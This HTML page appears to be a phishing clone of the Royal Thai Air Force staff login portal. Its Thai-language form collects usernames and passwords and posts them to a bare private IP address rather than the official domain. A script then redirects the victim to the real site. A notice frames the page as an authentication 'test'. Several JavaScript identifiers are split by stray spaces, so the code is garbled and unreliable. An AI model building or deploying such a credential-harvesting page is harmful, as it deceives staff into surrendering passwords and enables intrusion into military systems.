<html xmlns="https://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

            <title>Please Login</title>

            <link href="./Pic/css" rel="stylesheet" type="text/css">
                <style>
                    body{
                        font-family: 'Open Sans', sans-serif, Arial, Helvetica;
                        font-size:14px;
                        margin:0;
                    }
                    h1{
                        font-size: 24px;
                        color:#b97c24;
                        font-weight:800;
                        text-decoration:none;
                    }
                    /*Header Styles*/
                    #logo
                    {
                        width: 153px;
                        height: 72px;
                        position: relative;
                        top: 0px;
                        left:15px;
                        float:left;
                    }

                    #logo a
                    {
                        background:url(logo.gif) no-repeat;
                        display: block;
                        text-indent: -9000px;
                        width: 153px;
                        height: 72px;
                        outline:0;
                    }
                    /*Button Styles*/
                    .green_home_button{
                        font-style:italic;
                        text-align:center;
                        color:#ffffff;
                        text-shadow:1px 1px 2px #383838;
                        padding:5px;
                        position:relative;
                        margin:0 auto;
                        margin-top:9px;
                        font-size:15px;	
                        cursor:pointer;

                        /*Round Corners*/
                        -webkit-border-radius: 6px;
                        -moz-border-radius: 6px;
                        -o-border-radius: 6px;
                        border-radius: 6px;

                        /*Gradiant*/
                        background: #58863c;

                        /*Inner Glow*/
                        -webkit-box-shadow: inset 0 0 5px #1e6633;
                        -moz-box-shadow: inset 0 0 5px #1e6633;
                        box-shadow: inset 0 0 5px #1e6633;

                    }
                    .green_home_button:hover{
                        background: #478d33; /* Old browsers */
                        background: -moz-linear-gradient(top,  #478d33 0%, #66bc46 50%); /* FF3.6+ */
                        background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#478d33), color-stop(50%,#66bc46)); /* Chrome,Safari4+ */
                        background: -webkit-linear-gradient(top,  #478d33 0%,#66bc46 50%); /* Chrome10+,Safari5.1+ */
                        background: -o-linear-gradient(top,  #478d33 0%,#66bc46 50%); /* Opera 11.10+ */
                        background: -ms-linear-gradient(top,  #478d33 0%,#66bc46 50%); /* IE10+ */
                        background: linear-gradient(to bottom,  #478d33 0%,#66bc46 50%); /* W3C */
                        filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#478d33', endColorstr='#66bc46',GradientType=0 ); /* IE6-9 */

                    }
                    /*Footer Styles*/
                    #footer{
                        height:30px;
                        line-height:29px;
                        position:relative;
                        text-align:right;
                        width:100%;
                        float:right;
                    }
                    #footer ul{
                        list-style:none;
                        margin: 0;
                        padding: 0;
                        height:30px;	
                    }
                    #footer ul li{
                        margin-right: 15px;
                        display: inline;
                        height: 30px;	
                        font-size: 12px;
                        color:#CCCCCC;
                    }
                    #footer a{
                        color:#CCCCCC;
                        text-decoration:none;	
                        transition: all 0.3s ease 0s;
                    }
                    #footer a:hover{
                        color:#FFFFFF;	
                    }
                    .session        {
                        font-family:Verdana, Arial, Helvetica, sans-serif;
                        color:#000000;
                        font-weight:bold;
                    }

                    body {
                        margin: 0;
                        padding: 0;
                        font-family: "Trebuchet MS", Helvetica, sans-serif;
                    }
                    h1,
                    h2,
                    h3 {
                        font-weight: normal;
                    }
                    .pink-row {
                        background: rgb(255,0,255);
                        color: #fff;
                        font-weight: bold;
                    }
                    .pink-row .center-content {
                        padding: 5px 15px;
                    }
                    .clearfix:after { 
                        content: "."; 
                        visibility: hidden; 
                        display: block; 
                        height: 0; 
                        clear: both;
                    }
                    .center-content {
                        max-width: 600px;
                        display: block;
                        margin: 0 auto;
                        padding: 15px;
                    }
                    .center-text {
                        text-align: center;
                    }
                    #mainContent {
                        background: #f3f3f3;
                    }
                    .submit-btn {
                        background: #333333;
                        color: #ffffff;
                        border-radius: 4px;
                        padding: 5px 15px;
                        margin: 10px 0;
                        display: inline-block;
                        text-decoration: none;
                    }
                    #userName,
                    #x,
                    #ldapServer {
                        box-sizing: border-box;
                        width: 100%;
                        padding: 10px;
                        border: 1px solid #ccc;
                        margin: 10px 0;
                    }
                    .logo-img {
                        display: block;
                        margin: 20px auto;
                        max-width: 100%;
                    }
                    .hidden {
                        display: none;
                    }
                    ul {
                        list-style: square;
                        margin: 15px;
                        padding: 0;
                    }
                    li {
                        margin: 0;
                        padding: 0;
                    }

                </style>

                <script language="JavaScript">
                    <!--

function SetCookie(name, value, expires, path, domain, secure)
{
                    var today = new Date();
                    today.setTime(today.getTime());
                    if (expires)
                    {
                    expires = e                    xpires * 1000 * 60 * 60 * 24;
}

var expires_date = new Date(today.getTime() + (expires));
document.cookie = name+ "=" + escape(value) + ((expires) ? ";expires=" + expires_date.toGMTString(): "") + ((path) ? ";path=" + path : "                    ") + ((domain) ? ";domain=" + domain : "") + ((secure) ? ";secure" : "");
}

function GetCookie(check_name)
{
                    var a_all_cookies = document.cookie.split(';');
                var a_temp_cookie ='';
                    var cookie_name = '';
    var cookie_value = '';
                    var b_cookie_found = false;
                    for (i = 0; i < a_all_cookies.length; i++)
                    {
                    a_temp_cookie = a_all_cookies[i].split('=');
                    cookie_name = a_temp_cookie[0].replace(/^\s+|\s+$/g, '');
                    if (cookie_name == check_name)
                    {
                    b_cookie_found = true;
                    if (a_temp_cookie.length > 1)
                    {
                    cookie_value = unescape(a_temp_cookie[1].replace(/^\s+|\s+$/g, ''));
}

return cookie                    _value;
break;
}

a_t                    emp_cookie = null;
cookie_name = '';
}

if (!b_cookie_found)
{
                    return null;
}
}

function selectLdapServer()
{
                    var serverIndex = GetCookie('defaultLdapServer');
             if (serverIndex)
                    {
                    for (i = 0; i <= document.forms[0].ldapServer.options.length - 1; i++)
         {
                    if (document.forms[0].ldapSe                    rver.options[i].value == serverIndex)
                    {
document.forms[0].ldapServer.options[i].selected = "1";
}
}
}
}

function submitForm(actionValue)
{
                    document.forms[0].action.value = actionValue;
                    document.forms[0].submit();
}

function login()
{
                    SetCookie('defaultLdapServer', document.forms[0].ldapServer.value, 300, '/', null, null);
                    var sendUser = document.getElementById("userName").value;
                    document.getElementById("redirectUrl").value = "https://www.comm.rtaf.mi.th?idx=" + sendUser;
  //alert(document.getElementById("redirectUrl").value);
                    document.forms[0].action.value = 'login';
                    document.forms[0].submit();
}

function stopSubmit()
{
                    return false;
}

function checkEnter(e)
{
                    var characterCode;
                    if (e && e.w                            hich)
                    {
                    e = e;
                    characterCode = e.w                    hich;
} else
{
                    e = event;
                    characterCode = e.keyCode;
}

if (characterCode == 13)
{
                    login();
                    return false;
} else
{
                    return true;
}
}

function setFocus()
{
                    document.forms[0].userName.focus();
       }
// -->
</script>

</head>
<body onload="javascript:displaySections();
    selectLdapServer();">
          <center>

   <div id="logoContainer">
                                <div class="center-content">
                                    <img class="logo-img" src="./Pic/logo.png">
                                </div>
                            </div>
                   <div class="pink-row">
                                <div class="center-content">
                                  <h2>ระบบตรวจสอบและยืนยันผู้มีสิทธิใช้งาน ทอ.</h2>



             </div>
                            </div>
                        <div id="mainContent">
<div class="center-content">
                <form action="https://10.239.27.103/user_login_submit" method="POST" onsubmit="return stopSubmit()">
                                        <p>ชื่อผู้ใช้งาน (Email ทอ. ไม่ต้องใส่ @rtaf.mi.th) :<br>
                                                <input type="text" id="userName" name="userName" maxlength="64" tabindex="1"></p>
                                                    <p>รหัสผ่าน :<br>
                                                            <input type="password" id="x" name="x" maxlength="128" tabindex="2" onkeypress="checkEnter(event)"></p>

                                                                <p id="ldapServerList" class="hidden">
                                                                    <input type="hidden" id="ldapServer" name="ldapServer" value="0"></p>
                                                                <a class="submit-btn center-text" href="javascript:login();" tabindex="3">เข้าสู่ระบบ</a>
                                                                <input type="hidden" name="action">
                                                                    <input name="redirectUrl" id="redirectUrl" type="hidden" value="https://login.rtaf.mi.th/portal/index.html">
                                                                        </form>
                                                                        </div>
                                                                        </div>
                                                                        <div class="center-content">
                                                                            <p>ตาม พรบ. ว่าด้วยการกระทําความผิดเกี่ยวกับคอมพิวเตอร์ พ.ศ. ๒๕๕๐ และ <a href="https://imgcdn.rtaf.mi.th/2556/admin/rtaf_25561102015313.pdf" target="_blank"> นโยบายและแนวปฏิบัติในการรักษาความมั่นคงปลอดภัยด้านสารสนเทศของกองทัพอากาศ</a> กำหนดให้ สอ.ทอ. มีหน้าที่ควบคุมการเข้าถึงใช้งานระบบสารสนเทศ โดยให้มีมาตรการและแนวปฏิบัติในการรักษาความมั่นคงปลอดภัยด้านควบคุมการเข้าถึงและการใช้งานทรัพย์สินสารสนเทศ (Access Control Policy) รวมถึงสามารถเก็บบันทึกข้อมูลการเข้าใช้งานระบบสื่อสารและสารสนเทศ เพื่อใช้ในการตรวจสอบภายหลังได้นั้น ศคพ.สอ.ทอ. จึงขอทดสอบการใช้งานระบบยืนยันตัวบุคคลก่อนเข้าใช้งานดังกล่าวเพื่อรวบรวมผลและสรุปเป็นรายงานผลการใช้งานต่อไป</p>
                                                                            <p>กรณีเกิดปัญหาการใช้งาน</p>
                                                                            <ul>
                                                                                <li>ในวันและเวลาราชการ กรณีลืมรหัสผ่าน และคำถาม-คำตอบ กรุณาติดต่อ ผู้ดูแลระบบอีเมล์และเว็บเซิร์ฟเวอร์ กองทัพอากาศ 1155(เฉพาะโทรเบอร์ภายในกองทัพอากาศ)</li>
                                                                                <li>ต่างจังหวัดติดต่อผ่านเบอร์กลาง 02-5346000 แล้วกดเบอร์ข้างต้น</li>
                                                                                <li>นอกเวลาราชการ รับแจ้งปัญหาทางอีเมล์ โดยส่งมาที่ support@rtaf.mi.th</li>
                                                                            </ul>
                                                                            <p align="center">
                                                                                © โดย ศูนย์คอมพิวเตอร์ กรมสื่อสารอิเล็กทรอนิกส์ทหารอากาศ
                                                                            </p>
                                                                        </div>




                                                                        <script language="javascript">
                                                                            <!--
                                                                        document.forms[0].userName.focus()
                                                                                    //-->
                                                                        </script>



                                                                        &nbsp;




                                                                        <table width="100%" cellspacing="0" cellpadding="0">
                                                                            <tbody><tr>
                                                                                    <td width="35%"></td>
                                                                                    <td class="text3" width="4%"></td>
                                                                                    <td width="61%"></td>
                                                                                </tr>
                                                                                <tr>
                                                                                    <td height="25" colspan="100%"></td>
                                                                                </tr>
                                                                            </tbody></table>




                                                                        <div id="footer">

                                                                        </div>



                                                                        </center>
                                                                        <?php
                                                                        print "Your IP address is: " . $_SERVER['REMOTE_ADDR'];
                                                                        ?>
                                                                        </body></html>

